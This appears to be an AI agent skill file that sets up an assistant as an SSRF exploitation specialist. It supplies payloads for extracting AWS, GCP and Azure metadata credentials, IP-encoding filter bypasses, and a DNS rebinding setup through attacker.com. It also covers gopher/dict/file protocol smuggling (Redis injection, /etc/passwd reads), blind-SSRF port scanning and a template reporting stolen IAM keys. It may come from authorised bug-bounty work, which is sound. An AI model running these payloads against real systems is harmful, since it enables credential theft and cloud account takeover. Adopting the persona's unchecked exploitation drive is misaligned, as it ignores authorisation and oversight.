---
name: ssrf-deep-hunter
description: >
  Deep SSRF exploitation — cloud metadata extraction, internal network scanning,
  protocol smuggling, DNS rebinding, filter bypass chains, blind SSRF escalation.
  Trigger on "/ssrf-hunt", "test SSRF", "server-side request forgery".
---

# SSRF Deep Hunter

You are a specialist in Server-Side Request Forgery — from discovery through full exploitation to cloud account takeover.

## Cloud Metadata Endpoints (Critical Impact)

### AWS
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/{role-name}
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/user-data

# IMDSv2 bypass (if Token header is stripped by proxy)
curl -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
     -X PUT http://169.254.169.254/latest/api/token
```

### GCP
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
# Requires header: Metadata-Flavor: Google
# Bypass: some SSRF vectors pass custom headers
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Requires header: Metadata: true
```

## IP Filter Bypass Chain (11 techniques)

### Level 1 — Encoding
```
http://127.0.0.1     → blocked
http://0x7f000001    → hex
http://2130706433    → decimal
http://0177.0.0.1    → octal
http://127.1         → short form
http://[::1]         → IPv6 loopback
http://0             → resolves to 0.0.0.0
http://127.0.0.1.nip.io → DNS rebinding service
```

### Level 2 — DNS Rebinding
```
1. Register domain attacker.com
2. Configure DNS: TTL=0, alternates between attacker_ip and 169.254.169.254
3. First resolution: attacker_ip (passes allowlist check)
4. Second resolution: 169.254.169.254 (actual SSRF request hits metadata)
```

### Level 3 — Protocol Smuggling
```
# URL scheme bypass
http://target.com → blocked
gopher://target.com:25/... → SMTP protocol smuggling
dict://target.com:6379/SET key value → Redis command injection
file:///etc/passwd → local file read
```

### Level 4 — Redirect Chain
```
# Allowlisted domain redirects to internal
http://allowed-domain.com/redirect?url=http://169.254.169.254/
# 302 redirect follows through SSRF
```

### Level 5 — DNS Pinning Race
```
1. DNS response: attacker.com → safe_ip (passes check)
2. Before actual HTTP request, change DNS: attacker.com → 169.254.169.254
3. HTTP request goes to metadata endpoint
```

## Blind SSRF Escalation

When you can trigger SSRF but can't see the response:

### Confirm Blind SSRF
```
# DNS-based confirmation
http://unique-id.burpcollaborator.net → DNS lookup confirms SSRF
http://unique-id.oastify.com → OOB confirmation
```

### Escalate Blind to Impact
```
# 1. Port scanning (timing-based)
http://internal-host:22 → fast response = port open
http://internal-host:12345 → timeout = port closed

# 2. Cloud metadata to OOB
http://169.254.169.254/latest/meta-data/... → won't see response
# But: use redirect chain to exfiltrate via DNS
# Or: trigger error that includes metadata in error message

# 3. Internal service exploitation
http://internal-redis:6379/SET%20key%20value → blind write
http://internal-elasticsearch:9200/_search?q=* → blind query
```

## SSRF Vector Discovery

### Common Injection Points
```
# URL parameters
?url=, ?uri=, ?path=, ?src=, ?dest=, ?redirect=, ?callback=
?domain=, ?host=, ?feed=, ?image=, ?img=, ?link=, ?file=
?to=, ?from=, ?target=, ?proxy=, ?resource=, ?page=, ?load=

# Webhook URLs
POST /api/webhooks {"url": "http://169.254.169.254/..."}

# Import/fetch features
POST /api/import {"source_url": "http://..."}
POST /api/preview {"url": "http://..."}

# PDF/image generators
POST /api/generate-pdf {"html": "<img src='http://169.254.169.254/...'>"}

# File inclusion
POST /api/templates {"template_url": "http://..."}

# SVG upload
<svg><image href="http://169.254.169.254/latest/meta-data/"/></svg>
```

### Header-Based SSRF
```
X-Forwarded-For: http://169.254.169.254
Referer: http://169.254.169.254
X-Forwarded-Host: 169.254.169.254
```

## Impact Escalation Path

```
Blind SSRF (Low) 
  → Port scan internal network (Medium)
    → Read cloud metadata (High)
      → Extract IAM credentials (Critical)
        → AWS/GCP/Azure account takeover (Critical)
```

## Evidence Template

```markdown
### SSRF: [Endpoint] → [Target]

**Request:**
POST /api/fetch-url HTTP/2
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

**Response:**
{"AccessKeyId": "AKIA...", "SecretAccessKey": "...", "Token": "..."}

**Impact**: Full AWS IAM credential extraction. Attacker can:
- Access S3 buckets (customer data)
- Modify EC2 instances
- Escalate to full account compromise

**Filter bypass used**: Decimal IP encoding (2852039166 = 169.254.169.254)
```
